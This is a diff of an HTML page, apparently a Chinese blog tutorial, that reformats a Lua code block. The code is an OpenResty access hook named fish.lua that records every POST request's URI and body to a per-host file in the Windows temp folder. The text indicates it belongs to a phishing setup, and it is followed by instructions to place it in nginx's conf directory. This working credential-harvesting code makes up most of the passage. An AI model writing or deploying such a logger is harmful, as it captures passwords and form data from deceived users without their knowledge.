@@ -60,18 +60,18 @@
 <p>根据P神的文章里面:</p>
 <p><code>access_by_lua_file /usr/local/openresty/luasrc/fish.lua;</code></p>
 <p>这个配置是http请求之前执行的，所以修改下这个lua文件：</p>
-<div class="highlight"><pre><span></span><span class="nv">local</span> <span class="nv">method</span><span class="o">=</span><span class="nv">ngx</span>.<span class="nv">req</span>.<span class="nv">get_method</span><span class="ss">()</span>
-<span class="nv">local</span> <span class="nv">fd</span> <span class="o">=</span> <span class="nv">io</span>.<span class="nv">open</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">C:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">temp</span><span class="se">\\</span><span class="s2">&quot;</span>..<span class="nv">ngx</span>.<span class="nv">var</span>.<span class="nv">host</span>..<span class="s2">&quot;</span><span class="s">.txt</span><span class="s2">&quot;</span>,<span class="s2">&quot;</span><span class="s">ab</span><span class="s2">&quot;</span><span class="ss">)</span>
-<span class="nv">ngx</span>.<span class="nv">req</span>.<span class="nv">read_body</span><span class="ss">()</span>
-<span class="nv">local</span> <span class="nv">data</span><span class="o">=</span><span class="nv">ngx</span>.<span class="nv">req</span>.<span class="nv">get_body_data</span><span class="ss">()</span>
-<span class="nv">local</span> <span class="nv">uri</span> <span class="o">=</span> <span class="nv">ngx</span>.<span class="nv">var</span>.<span class="nv">request_uri</span>
-<span class="k">if</span> <span class="nv">fd</span> <span class="o">==</span> <span class="nv">nil</span> <span class="k">then</span> <span class="k">return</span> <span class="k">end</span>
-<span class="k">if</span> <span class="nv">method</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="s">POST</span><span class="s2">&quot;</span> <span class="k">then</span>
-    <span class="k">if</span> <span class="nv">data</span> <span class="o">==</span> <span class="nv">nil</span> <span class="k">then</span> <span class="k">return</span> <span class="k">end</span>
-    <span class="nv">fd</span>:<span class="nv">write</span><span class="ss">(</span><span class="nv">uri</span>..<span class="s2">&quot;</span><span class="s">[*]</span><span class="s2">&quot;</span>..<span class="nv">data</span>..<span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="ss">)</span>
-    <span class="nv">fd</span>:<span class="nv">close</span><span class="ss">()</span>
-<span class="k">end</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">local method=ngx.req.get_method()</span>
+<span class="err">local fd = io.open(&quot;C:\\windows\\temp\\&quot;..ngx.var.host..&quot;.txt&quot;,&quot;ab&quot;)</span>
+<span class="err">ngx.req.read_body()</span>
+<span class="err">local data=ngx.req.get_body_data()</span>
+<span class="err">local uri = ngx.var.request_uri</span>
+<span class="err">if fd == nil then return end</span>
+<span class="err">if method == &quot;POST&quot; then</span>
+<span class="err">    if data == nil then return end</span>
+<span class="err">    fd:write(uri..&quot;[*]&quot;..data..&quot;\n&quot;)</span>
+<span class="err">    fd:close()</span>
+<span class="err">end</span>
+</code></pre></div>
 
 
 <p>把这一坨翔保存为fish.lua，然后放到nginx里面conf目录下，修改nginx.conf：</p>
